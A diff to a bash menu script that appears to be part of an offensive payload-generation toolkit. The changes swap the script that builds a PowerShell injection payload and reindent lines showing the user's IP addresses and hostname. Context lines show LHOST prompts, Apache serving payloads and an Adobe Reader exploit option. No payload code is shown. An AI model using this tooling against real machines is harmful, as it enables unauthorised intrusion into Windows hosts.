@@ -54,6 +54,7 @@ disrov=$rlname
 SERVICE=service;
 apkembed='tools/apkembed.rb' # exec script path
 pwned='python tools/pw_exec.py'
+dave='python tools/trusted_2_6.py'
 B='tools/prog.cs'
 C='tools/dad.c'
 apache='tools/apache.c'
@@ -1878,11 +1879,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 			if test $fatrat1 == '1' #NUMBER 1 BEBE
 				then
 					echo ""
-          echo -e $okegreen""
-          echo -e $yellow "  Your local IP address is : $lanip"
-          echo -e $yellow "  Your public IP address is : $publicip"
-          echo -e $yellow "  Your Hostname is : $hostn"
-          echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1898,7 +1899,7 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					$dave $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
 					cat powershell_attack.txt
@@ -1912,11 +1913,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					elif test $fatrat1 == '2' #cPAGAR-POWERSHELL
 					then
 					echo ""
-          echo -e $okegreen""
-          echo -e $yellow "  Your local IP address is : $lanip"
-          echo -e $yellow "  Your public IP address is : $publicip"
-          echo -e $yellow "  Your Hostname is : $hostn"
-          echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1960,11 +1961,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					echo -e $okegreen " Starting Apache Server wait ..."
 					service apache2 start > /dev/null 2>&1
 					echo ""
-          echo -e $okegreen""
-          echo -e $yellow "  Your local IP address is : $lanip"
-          echo -e $yellow "  Your public IP address is : $publicip"
-          echo -e $yellow "  Your Hostname is : $hostn"
-          echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2003,11 +2004,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					elif test $fatrat1 == '4' #C AJA
 					then
 					echo ""
-          echo -e $okegreen""
-          echo -e $yellow "  Your local IP address is : $lanip"
-          echo -e $yellow "  Your public IP address is : $publicip"
-          echo -e $yellow "  Your Hostname is : $hostn"
-          echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2049,11 +2050,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					then
 					echo
 					echo -e $yellow"  Worked on Adobe Reader v8.x, v9.x / Windows XP SP3 / Windows 7/Vista ( English )"
-          echo -e $okegreen""
-          echo -e $yellow "  Your local IP address is : $lanip"
-          echo -e $yellow "  Your public IP address is : $publicip"
-          echo -e $yellow "  Your Hostname is : $hostn"
-          echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
